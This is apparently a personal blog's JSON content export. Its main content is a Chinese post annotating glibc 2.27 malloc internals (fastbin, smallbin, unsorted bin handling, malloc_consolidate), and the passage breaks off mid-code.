{"meta":{"title":"try","subtitle":"go","description":"for study","author":"zzl","url":"https://www.zzl14.xyz","root":"/"},"pages":[{"title":"关于","date":"2020-04-03T08:19:00.000Z","updated":"2020-04-10T08:50:08.732Z","comments":true,"path":"about/index.html","permalink":"https://www.zzl14.xyz/about/index.html","excerpt":"","text":"本人:在读大学生QQ：21487271014 版权声明本站部分内容转载于网络，有出处的已在文中署名作者并附加原文链接，出处已不可寻的皆已标注来源于网络，若您认为本博客有部分内容侵犯了您的版权，请电邮告知，我将认真处理。 免责声明本博客提供的所有内容仅供学习、分享与交流，并且不保证内容的正确性。通过使用本站内容随之而来的风险与本站无关。当使用本站时，代表你已接受本站的免责声明和隐私原则等条款。"},{"title":"分类","date":"2020-04-03T08:20:21.000Z","updated":"2020-04-19T05:38:30.993Z","comments":true,"path":"categories/index.html","permalink":"https://www.zzl14.xyz/categories/index.html","excerpt":"","text":""},{"title":"图片","date":"2020-04-06T13:40:27.000Z","updated":"2020-04-07T05:34:18.699Z","comments":true,"path":"gallery/index.html","permalink":"https://www.zzl14.xyz/gallery/index.html","excerpt":"","text":""},{"title":"link","date":"2020-04-05T09:34:13.000Z","updated":"2020-04-05T09:34:44.385Z","comments":true,"path":"link/index.html","permalink":"https://www.zzl14.xyz/link/index.html","excerpt":"","text":""},{"title":"music","date":"2020-04-06T13:43:54.000Z","updated":"2020-04-06T13:43:54.112Z","comments":true,"path":"music/index.html","permalink":"https://www.zzl14.xyz/music/index.html","excerpt":"","text":""},{"title":"标签","date":"2020-04-03T08:20:50.000Z","updated":"2020-04-07T06:31:57.648Z","comments":true,"path":"tags/index.html","permalink":"https://www.zzl14.xyz/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"malloc流程","slug":"malloc流程","date":"2020-04-13T02:14:34.000Z","updated":"2020-04-19T05:51:59.762Z","comments":true,"path":"2020/04/13/malloc流程/","link":"","permalink":"https://www.zzl14.xyz/2020/04/13/malloc流程/","excerpt":"","text":"以下源码均来自libc2.27版本 __libc_malloc可以看出申请内存的工作进一步给到了_int_malloc函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; //空指针，返回的malloc地址 //判断是否有自定义堆分配函数，即__malloc_hook是否为空 void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) //如果不为空，则执行hook函数并返回。 return (*hook)(bytes, RETURN_ADDRESS (0));//如果使用TCACHE，执行下面代码，这里先不讨论（tcache是libc2.26之后引进的一种新机制，类似于fastbin） #if USE_TCACHE /* int_free also calls request2size, be careful to not pad twice. */ size_t tbytes; checked_request2size (bytes, tbytes); size_t tc_idx = csize2tidx (tbytes); MAYBE_INIT_TCACHE (); DIAG_PUSH_NEEDS_COMMENT; if (tc_idx &lt; mp_.tcache_bins /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */ &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) &#123; return tcache_get (tc_idx); &#125; DIAG_POP_NEEDS_COMMENT;#endif //到这里继续看 if (SINGLE_THREAD_P) //如果是单线程的，默认从main_arena申请内存 &#123; victim = _int_malloc (&amp;main_arena, bytes); //assert()其作用是如果它的条件返回错误，则终止程序执行 //这里要满足1.申请到内存 2.是mmap的内存 3.申请到的内存必须在其所分配的arena中 assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || &amp;main_arena == arena_for_chunk (mem2chunk (victim))); return victim; &#125; arena_get (ar_ptr, bytes); // 获取或创建arena 并且会将arena 加锁(mutex 互斥锁)处理。 victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. 只有当我们能够找到一个可用的 arena 时，才可以用另一个 arena 重试*/ if (!victim &amp;&amp; ar_ptr != NULL) //如果没有分配到内存，且有可用的arena &#123; LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) //申请到了arena，在退出前需要解锁。 __libc_lock_unlock (ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;&#125; _int_malloc 这里是源码 之后将源码拆分分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620static void *_int_malloc (mstate av, size_t bytes)&#123; INTERNAL_SIZE_T nb; /* normalized request size */ unsigned int idx; /* associated bin index */ mbinptr bin; /* associated bin */ mchunkptr victim; /* inspected/selected chunk */ INTERNAL_SIZE_T size; /* its size */ int victim_index; /* its bin index */ mchunkptr remainder; /* remainder from a split */ unsigned long remainder_size; /* its size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* current word of binmap */ mchunkptr fwd; /* misc temp for linking */ mchunkptr bck; /* misc temp for linking */#if USE_TCACHE size_t tcache_unsorted_count; /* count of unsorted chunks processed */#endif /* Convert request size to internal form by adding SIZE_SZ bytes overhead plus possibly more to obtain necessary alignment and/or to obtain a size of at least MINSIZE, the smallest allocatable size. Also, checked_request2size traps (returning 0) request sizes that are so large that they wrap around zero when padded and aligned. */ checked_request2size (bytes, nb); //字节对齐，将申请字节大小转化为内部chunk大小 //nb就是转化为chunk的大小 /* There are no usable arenas. Fall back to sysmalloc to get a chunk from mmap. */ //没有可用的 arena。用sysmalloc以从mmap获得chunk. if (__glibc_unlikely (av == NULL)) &#123; void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; &#125; /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. *///---------------------------------------------------//---------------------------------------------------//宏定义一个函数 REMOVE_FB #define REMOVE_FB(fb, victim, pp) \\ do \\ &#123; \\ victim = pp; \\ if (victim == NULL) \\ break; \\ &#125; \\ while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \\ != victim); \\ //如果*fd=victim,则*fd=victim-&gt;fd,返回victim，即*fd！=victim进行循环//---------------------------------------------------//--------------------------------------------------- //如果nb(chunk)大小在fastbin范围 if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; idx = fastbin_index (nb); mfastbinptr *fb = &amp;fastbin (av, idx); mchunkptr pp; victim = *fb; if (victim != NULL) &#123; if (SINGLE_THREAD_P) *fb = victim-&gt;fd; else REMOVE_FB (fb, pp, victim); if (__glibc_likely (victim != NULL)) &#123; size_t victim_idx = fastbin_index (chunksize (victim)); if (__builtin_expect (victim_idx != idx, 0)) malloc_printerr (\"malloc(): memory corruption (fast)\"); check_remalloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL) &#123; if (SINGLE_THREAD_P) *fb = tc_victim-&gt;fd; else &#123; REMOVE_FB (fb, pp, tc_victim); if (__glibc_unlikely (tc_victim == NULL)) break; &#125; tcache_put (tc_victim, tc_idx); &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; &#125; /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) &#123; bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)) malloc_printerr (\"malloc(): smallbin double linked list corrupted\"); set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; if (av != &amp;main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else &#123; idx = largebin_index (nb); if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks)) malloc_consolidate (av); &#125; /* Process recently freed or remaindered chunks, taking one only if it is exact fit, or, if this a small request, the chunk is remainder from the most recent non-exact fit. Place other traversed chunks in bins. Note that this step is the only place in any routine where chunks are placed in bins. The outer loop here is needed because we might not realize until near the end of malloc that we should have consolidated, so must do so and retry. This happens at most once, and only when we would otherwise need to expand memory to service a \"small\" request. */#if USE_TCACHE INTERNAL_SIZE_T tcache_nb = 0; size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) tcache_nb = nb; int return_cached = 0; tcache_unsorted_count = 0;#endif for (;; ) &#123; int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123; bck = victim-&gt;bk; if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize_nomask (victim) &gt; av-&gt;system_mem, 0)) malloc_printerr (\"malloc(): memory corruption\"); size = chunksize (victim); /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123; /* split and reattach remainder */ remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; /* remove from unsorted list */ unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); /* Take now instead of binning if exact fit */ if (size == nb) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) set_non_main_arena (victim);#if USE_TCACHE /* Fill cache first, return to user only if cache fills. We may return one of these chunks later. */ if (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (victim, tc_idx); return_cached = 1; continue; &#125; else &#123;#endif check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p;#if USE_TCACHE &#125;#endif &#125; /* place chunk in bin */ if (in_smallbin_range (size)) &#123; victim_index = smallbin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; &#125; else &#123; victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; /* maintain large bins in sorted order */ if (fwd != bck) &#123; /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert (chunk_main_arena (bck-&gt;bk)); if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) &#123; fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; else &#123; assert (chunk_main_arena (fwd)); while ((unsigned long) size &lt; chunksize_nomask (fwd)) &#123; fwd = fwd-&gt;fd_nextsize; assert (chunk_main_arena (fwd)); &#125; if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd)) /* Always insert in the second position. */ fwd = fwd-&gt;fd; else &#123; victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; bck = fwd-&gt;bk; &#125; &#125; else victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim; &#125; mark_bin (av, victim_index); victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim;#if USE_TCACHE /* If we've processed as many chunks as we're allowed while filling the cache, return one of the cached ones. */ ++tcache_unsorted_count; if (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; 0 &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit) &#123; return tcache_get (tc_idx); &#125;#endif#define MAX_ITERS 10000 if (++iters &gt;= MAX_ITERS) break; &#125;#if USE_TCACHE /* If all the small chunks we found ended up cached, return one now. */ if (return_cached) &#123; return tcache_get (tc_idx); &#125;#endif /* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */ if (!in_smallbin_range (nb)) &#123; bin = bin_at (av, idx); /* skip scan if empty or largest chunk is too small */ if ((victim = first (bin)) != bin &amp;&amp; (unsigned long) chunksize_nomask (victim) &gt;= (unsigned long) (nb)) &#123; victim = victim-&gt;bk_nextsize; while (((unsigned long) (size = chunksize (victim)) &lt; (unsigned long) (nb))) victim = victim-&gt;bk_nextsize; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ if (victim != last (bin) &amp;&amp; chunksize_nomask (victim) == chunksize_nomask (victim-&gt;fd)) victim = victim-&gt;fd; remainder_size = size - nb; unlink (av, victim, bck, fwd); /* Exhaust */ if (remainder_size &lt; MINSIZE) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) set_non_main_arena (victim); &#125; /* Split */ else &#123; remainder = chunk_at_offset (victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks (av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) malloc_printerr (\"malloc(): corrupted unsorted chunks\"); remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); &#125; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; /* Search for a chunk by scanning bins, starting with next largest bin. This search is strictly by best-fit; i.e., the smallest (with ties going to approximately the least recently used) chunk that fits is selected. The bitmap avoids needing to check that most blocks are nonempty. The particular case of skipping all bins during warm-up phases when no chunks have been returned yet is faster than it might look. */ ++idx; bin = bin_at (av, idx); block = idx2block (idx); map = av-&gt;binmap[block]; bit = idx2bit (idx); for (;; ) &#123; /* Skip rest of block if there are no more set bits in this block. */ if (bit &gt; map || bit == 0) &#123; do &#123; if (++block &gt;= BINMAPSIZE) /* out of bins */ goto use_top; &#125; while ((map = av-&gt;binmap[block]) == 0); bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT)); bit = 1; &#125; /* Advance to bin with set bit. There must be one. */ while ((bit &amp; map) == 0) &#123; bin = next_bin (bin); bit &lt;&lt;= 1; assert (bit != 0); &#125; /* Inspect the bin. It is likely to be non-empty */ victim = last (bin); /* If a false alarm (empty bin), clear the bit. */ if (victim == bin) &#123; av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */ bin = next_bin (bin); bit &lt;&lt;= 1; &#125; else &#123; size = chunksize (victim); /* We know the first chunk in this bin is big enough to use. */ assert ((unsigned long) (size) &gt;= (unsigned long) (nb)); remainder_size = size - nb; /* unlink */ unlink (av, victim, bck, fwd); /* Exhaust */ if (remainder_size &lt; MINSIZE) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) set_non_main_arena (victim); &#125; /* Split */ else &#123; remainder = chunk_at_offset (victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks (av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) malloc_printerr (\"malloc(): corrupted unsorted chunks 2\"); remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; /* advertise as last remainder */ if (in_smallbin_range (nb)) av-&gt;last_remainder = remainder; if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); &#125; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; use_top: /* If large enough, split off the chunk bordering the end of memory (held in av-&gt;top). Note that this is in accord with the best-fit search rule. In effect, av-&gt;top is treated as larger (and thus less well fitting) than any other available chunk since it can be extended to be as large as necessary (up to system limitations). We require that av-&gt;top always exists (i.e., has size &gt;= MINSIZE) after initialization, so if it would otherwise be exhausted by current request, it is replenished. (The main reason for ensuring it exists is that we may need MINSIZE space to put in fenceposts in sysmalloc.) */ victim = av-&gt;top; size = chunksize (victim); if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-&gt;top = remainder; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks)) &#123; malloc_consolidate (av); /* restore original bin index */ if (in_smallbin_range (nb)) idx = smallbin_index (nb); else idx = largebin_index (nb); &#125; /* Otherwise, relay to handle system-dependent cases */ else &#123; void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; &#125; &#125;&#125; fastbin范围内 fastbin大致流程. 1.chunk大小在fastbin范围 2.通过用户申请字节获得fastbin下标 3.获取对应bin的地址，取得bin-&gt;fd也就是头结点。 4.判断bin是否为空，为空则判断是否在smallbin范围 5.不为空则判断取出的节点chunksize是否等于对应bin的大小 6.返回chunk的fd地址(也就是chunk的mem地址) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354 //如果nb(chunk)大小在fastbin范围 if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; idx = fastbin_index (nb); //idx就是bin的下标 mfastbinptr *fb = &amp;fastbin (av, idx); //取得fastbinsY[idx]地址赋给fb指针，*fb就是fastbin的首节点 mchunkptr pp; victim = *fb; //victim现在指向相应fastbinsY[idx]里的内容,指向bin的首部节点 if (victim != NULL) &#123; if (SINGLE_THREAD_P) //单线程时，fd指向bin的头结点，就是要取出的空闲chunk *fb = victim-&gt;fd; else REMOVE_FB (fb, pp, victim); if (__glibc_likely (victim != NULL)) //victim!=NULL向下执行 &#123; size_t victim_idx = fastbin_index (chunksize (victim)); if (__builtin_expect (victim_idx != idx, 0)) //victim_idx应该等于idx //这个地方就是常用的fastbin的检查 malloc_printerr (\"malloc(): memory corruption (fast)\"); check_remalloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL) &#123; if (SINGLE_THREAD_P) *fb = tc_victim-&gt;fd; else &#123; REMOVE_FB (fb, pp, tc_victim); if (__glibc_unlikely (tc_victim == NULL)) break; &#125; tcache_put (tc_victim, tc_idx); &#125; &#125;#endif void *p = chunk2mem (victim); //将chunk地址转化为用户可写地址（即chunk的fd位地址） alloc_perturb (p, bytes); //设初值 return p; &#125; &#125; &#125; smallbin范围 chunk大小在smallbin范围 获得bin下标 获取要取出的chunk地址 判断是否为空，为空则向下判断是否为largechunk 将下一个chunk的PREV_INUSE置为一，取出chunk，返回地址 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb); //smallbin的下标 bin = bin_at (av, idx); if ((victim = last (bin)) != bin) //smallbin不为空,victim=bin-&gt;bk,要取出的chunk &#123; bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)) malloc_printerr (\"malloc(): smallbin double linked list corrupted\"); set_inuse_bit_at_offset (victim, nb); //将下一个chunk的PREV_INUSE置为一 bin-&gt;bk = bck; bck-&gt;fd = bin; if (av != &amp;main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb); //检查标志位#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif void *p = chunk2mem (victim); //从malloc头到用户指针的转换 alloc_perturb (p, bytes); //初始化mem内存 return p; &#125; &#125; malloc_consolidate进行malloc_consolidate合并fastbins 123456else &#123; idx = largebin_index (nb); if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks)) malloc_consolidate (av); &#125; 函数流程 判断fastbin是否初始化，如果未初始化，则进行初始化然后退出。 按照fastbin由小到大的顺序合并chunk，每种相同大小的fastbin中chunk的处理顺序是从fastbin-&gt;fd开始取，下一个处理的是p-&gt;fd，依次类推。 首先尝试合并pre_chunk。 然后尝试合并next_chunk：如果next_chunk是top_chunk，则直接合并到top_chunk，然后进行第六步；如果next_chunk不是top_chunk，尝试合并。 将处理完的chunk插入到unsorted bin头部。 获取下一个空闲的fastbin，回到第二步，直到清空所有fastbin中的chunk，然后退出。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102/* ------------------------- malloc_consolidate ------------------------- malloc_consolidate is a specialized version of free() that tears down chunks held in fastbins. Free itself cannot be used for this purpose since, among other things, it might place chunks back onto fastbins. So, instead, we need to use a minor variant of the same code.*/static void malloc_consolidate(mstate av)&#123; mfastbinptr* fb; /* current fastbin being consolidated */ mfastbinptr* maxfb; /* last fastbin (for loop control) */ mchunkptr p; /* current chunk being consolidated */ mchunkptr nextp; /* next chunk to consolidate */ mchunkptr unsorted_bin; /* bin header */ mchunkptr first_unsorted; /* chunk to link to */ /* These have same use as in free() */ mchunkptr nextchunk; INTERNAL_SIZE_T size; INTERNAL_SIZE_T nextsize; INTERNAL_SIZE_T prevsize; int nextinuse; mchunkptr bck; mchunkptr fwd; atomic_store_relaxed (&amp;av-&gt;have_fastchunks, false); unsorted_bin = unsorted_chunks(av); /* Remove each chunk from fast bin and consolidate it, placing it then in unsorted bin. Among other reasons for doing this, placing in unsorted bin avoids needing to calculate actual bins until malloc is sure that chunks aren't immediately going to be reused anyway. */ maxfb = &amp;fastbin (av, NFASTBINS - 1); fb = &amp;fastbin (av, 0); do &#123; //如果fb&lt;fastbin最大值，fb++,按照由小到大的顺序合并chunk p = atomic_exchange_acq (fb, NULL); if (p != 0) &#123; //循环合并chunk，并p=p-&gt;fd直到p为0 do &#123; &#123; unsigned int idx = fastbin_index (chunksize (p)); if ((&amp;fastbin (av, idx)) != fb) malloc_printerr (\"malloc_consolidate(): invalid chunk size\"); &#125; check_inuse_chunk(av, p); nextp = p-&gt;fd; //按照fd的顺序遍历fastbin /* Slightly streamlined version of consolidation code in free() */ size = chunksize (p); nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); //获取下一个chunk和本chunk的size //pre_inuse为0,向前合并 if (!prev_inuse(p)) &#123; prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); &#125; //下面的chunk不是top_chunk if (nextchunk != av-&gt;top) &#123; nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) &#123; size += nextsize; unlink(av, nextchunk, bck, fwd); &#125; else clear_inuse_bit_at_offset(nextchunk, 0); first_unsorted = unsorted_bin-&gt;fd; unsorted_bin-&gt;fd = p; first_unsorted-&gt;bk = p; if (!in_smallbin_range (size)) &#123; p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; &#125; set_head(p, size | PREV_INUSE); p-&gt;bk = unsorted_bin; // 将此chunk放到unsoeted bin中 p-&gt;fd = first_unsorted; set_foot(p, size); &#125; else &#123; //如果下面的chunk是top_chunk，那么合并到top_chunk size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; &#125; &#125; while ( (p = nextp) != 0); &#125; &#125; while (fb++ != maxfb);&#125; 循环,处理unsorted_bin unsorted_bin不为空时，执行以下循环，iters为循环条件 1.如果请求的 chunk 是一个 small chunk, 且 unsorted bin 只有一个 chunk, 并且这个 chunk 在上次分配时被使用过(也就是 last_remainder), 并且 chunk 的大小大于 (分配的大小 + MINSIZE), 这种情况下就直接将该 chunk 进行切割,更新last_remainder,返回截取的chunk的mem地址 2.victim恰好等于申请chunk大小，返回chunk结束 3.victim放到对应大小的smallbin或者largebin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174 int iters = 0; //循环条件，最多10000次 while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123; //victim为unsorted_bin尾结点，指向正在处理的chunk bck = victim-&gt;bk; //bck是为了方便双链表的删除操作 if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize_nomask (victim) &gt; av-&gt;system_mem, 0)) malloc_printerr (\"malloc(): memory corruption\"); size = chunksize (victim); //size尾结点大小 /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. *//****************************************************************** 以下代码从last_remainder截取chunk******************************************************************/ if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123; /* split and reattach remainder */ remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb 